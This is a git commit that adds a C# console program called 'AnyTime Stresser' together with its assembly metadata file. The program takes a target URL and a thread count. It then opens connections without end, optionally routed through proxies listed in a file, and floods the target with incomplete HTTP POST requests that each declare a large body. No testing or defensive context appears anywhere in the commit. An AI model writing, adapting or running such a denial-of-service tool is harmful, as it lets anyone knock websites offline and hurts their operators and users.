a024f5a0c3b5237cd87ead7945af7bcda8497f60
dx7v2 <107001892+dx7v2@users.noreply.github.com>
2022-06-07 23:34:30 +0300

    Add files via upload

---
+++ AnyTime Stresser/Program.cs
@@ -0,0 +1,135 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace AnyTime_Stresser
+{
+    class Program
+    {
+        static string website;
+        static int count = 0;
+        static TcpClient ProxyTcpClient(string targetHost, int targetPort, string httpProxyHost, int httpProxyPort, string proxyUserName, string proxyPassword)
+        {
+            const BindingFlags Flags = BindingFlags.NonPublic | BindingFlags.Instance;
+            Uri proxyUri = new UriBuilder
+            {
+                Scheme = Uri.UriSchemeHttp,
+                Host = httpProxyHost,
+                Port = httpProxyPort
+            }.Uri;
+            Uri targetUri = new UriBuilder
+            {
+                Scheme = Uri.UriSchemeHttps,
+                Host = targetHost,
+                Port = targetPort
+            }.Uri;
+
+            WebProxy webProxy = new WebProxy(proxyUri, true);
+            webProxy.Credentials = new NetworkCredential(proxyUserName, proxyPassword);
+            WebRequest request = WebRequest.Create(targetUri);
+            request.Proxy = webProxy;
+            request.Method = "CONNECT";
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream responseStream = response.GetResponseStream();
+            Type responseType = responseStream.GetType();
+            PropertyInfo connectionProperty = responseType.GetProperty("Connection", Flags);
+            var connection = connectionProperty.GetValue(responseStream, null);
+            Type connectionType = connection.GetType();
+            PropertyInfo networkStreamProperty = connectionType.GetProperty("NetworkStream", Flags);
+            NetworkStream networkStream = (NetworkStream)networkStreamProperty.GetValue(connection, null);
+            Type nsType = networkStream.GetType();
+            PropertyInfo socketProperty = nsType.GetProperty("Socket", Flags);
+            Socket socket = (Socket)socketProperty.GetValue(networkStream, null);
+
+            return new TcpClient { Client = socket };
+        }
+        static void Hac()
+        {
+            new Thread((ThreadStart)(() =>
+            {
+                List<TcpClient> clients = new List<TcpClient>();
+                while (true)
+                {
+                    new Thread((ThreadStart)(() =>
+                    {
+                        TcpClient tcpClient = null;
+                        if (File.ReadAllText(Environment.CurrentDirectory + "//proxies.txt") == "")
+                        { tcpClient = new TcpClient(); }
+                        else
+                        {
+                            foreach(string s in File.ReadAllLines(Environment.CurrentDirectory + "//proxies.txt"))
+                            {
+                                string[] s2 = s.Split(':');
+                                tcpClient = ProxyTcpClient(website, 80, s2[0], int.Parse(s2[1]), "","");
+                            }
+                        }
+
+                        clients.Add(tcpClient);
+                        try
+                        {
+                            tcpClient.Connect(website, 80);
+                            StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
+                            streamWriter.Write("POST / HTTPS/1.1\r\nHost: " + website + "\r\nContent-length: 5235\r\n\r\n");
+                            streamWriter.Flush();
+                            if (true)
+                            {
+                                Console.ForegroundColor = ConsoleColor.Cyan;
+                                Console.WriteLine("Total packets sent: " + count);
+                            }
+                            count++;
+
+                        }
+                        catch (Exception)
+                        {
+                            if (true)
+                            {
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine("CANNOT POST PACKETS TO SERVER");
+                            }
+                        }
+                    })).Start();
+                    Thread.Sleep(50);
+                }
+             
+            })).Start();
+        }
+        static void Main(string[] args)
+        {
+            try
+            {
+                Thread.Sleep(500);
+                Console.ForegroundColor = ConsoleColor.DarkGreen;
+                Console.Title = "AnyTime Stresser by dx7v2";
+                string ascii = @"
+     _               _____ _                  ____  _                               
+    / \   _ __  _   |_   _(_)_ __ ___   ___  / ___|| |_ _ __ ___  ___ ___  ___ _ __ 
+   / _ \ | '_ \| | | || | | | '_ ` _ \ / _ \ \___ \| __| '__/ _ \/ __/ __|/ _ \ '__|
+  / ___ \| | | | |_| || | | | | | | | |  __/  ___) | |_| | |  __/\__ \__ \  __/ |   
+ /_/   \_\_| |_|\__, ||_| |_|_| |_| |_|\___| |____/ \__|_|  \___||___/___/\___|_|   
+                |___/                     By dx7v2                                          
+";
+                Console.WriteLine(ascii);
+                Thread.Sleep(500);
+                Console.ForegroundColor = ConsoleColor.Gray;
+                Console.WriteLine("URL: ");
+                website = Console.ReadLine();
+                Console.WriteLine("Thread count: ");
+                string threadS = Console.ReadLine();
+                int thread = int.Parse(threadS);
+                for (int i = 0; i < thread + 1; i++)
+                {
+                    Task.Factory.StartNew(() => Hac());
+                }
+                Console.ReadKey();
+            }
+            catch { }
+        }
+    }
+}
---
+++ AnyTime Stresser/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("AnyTime Stresser")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("AnyTime Stresser")]
+[assembly: AssemblyCopyright("Copyright ©  2022")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible
+// to COM components.  If you need to access a type in this assembly from
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("de28a0f2-cc4c-49f7-bae7-a74b162f706a")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
